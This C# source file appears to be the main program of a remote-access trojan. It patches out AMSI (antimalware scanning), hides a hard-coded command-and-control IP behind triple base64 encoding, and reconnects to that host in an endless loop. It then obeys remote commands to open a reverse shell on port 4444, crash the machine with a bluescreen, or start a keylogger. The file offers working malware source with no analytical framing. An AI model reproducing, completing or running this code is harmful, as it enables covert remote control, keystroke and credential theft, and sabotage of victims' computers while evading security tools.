
using mw.ampatch;
using System.IO;

using System.Net.Sockets;
using System.Runtime.InteropServices;
using mw.funcs;
using mw.utils;
namespace mw
{
    class mainProgram
    {
        static void Main(string[] args)
        {
            //amsi bypass
            patch.chaching();
            
            //Get-WmiObject -Query "Select * from Win32_CacheMemory" to check for vm

            //create a stream to 99.70.90.188:80
            string ip = base64.decode(base64.decode(base64.decode("VDFScmRVNTZRWFZQVkVGMVRWUm5OQT09")));
            int port = 80;
            while(true) {
                try{
                    Console.WriteLine("Connecting to " + ip + ":" + port);
                    connecttohost(ip, port);
                } catch (Exception e) {
                    //check if e is a socket exception
                    if (e.GetType() == typeof(SocketException)) {
                        //host is down. wait 60 seconds and try to connect again
                        Console.WriteLine("Host is down. Waiting 60 seconds and trying to connect again.");
                        System.Threading.Thread.Sleep(60000);
                    }
                    else {
                        Console.WriteLine(e.Message);
                        break;
                    }
                }
            }






        }
        //move to server side software
        static void connecttohost(string ip, int port) {
            //create a stream to
            using (TcpClient client = new TcpClient(ip, port)) {
                using (NetworkStream stream = client.GetStream()) {
                    //create a stream to the server
                    using (StreamReader reader = new StreamReader(stream)) {
                        using (StreamWriter writer = new StreamWriter(stream)) {
                            //read the server's response
                            string response = reader.ReadLine();
                            Console.WriteLine(response);
                            //send a message to the server
                            writer.WriteLine("Hello World!");
                            writer.Flush();
                            //read the server's response

                            while (true) {
                                if(reader.EndOfStream) {
                                    break;
                                }
                                response = reader.ReadLine();
                                switch (response) {
                                    case "exit":
                                        return;
                                    case "revSh":
                                        writer.WriteLine("creating revSh to port 4444");
                                        functions.revSh();
                                        break;
                                    case "bsod":
                                        functions.bsod();
                                        break;
                                    case "keylogger":
                                        functions.keylogger();
                                        break;
                                }
                            }
                        }
                    }
                }
            }
        }


    }
}